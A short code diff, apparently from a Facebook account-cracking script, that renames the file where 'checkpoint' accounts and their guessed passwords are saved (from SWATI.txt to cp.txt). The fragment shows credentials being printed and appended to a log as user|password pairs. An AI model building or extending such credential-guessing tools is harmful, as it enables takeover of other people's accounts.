@@ -988,7 +988,7 @@ def ran():
 							else:
 								if "www.facebook.com" in q["error_msg"]:
 									print(" \033[1;33m [CP] "+k+co+user+" | "+pass3+"\033[0;97m")
-									cp = open("SWATI.txt", "a")
+									cp = open("cp.txt", "a")
 									cp.write(k+co+user+"|"+pass3+"\n")
 									cp.close()
 									cps.append(k+co+user+pass3)
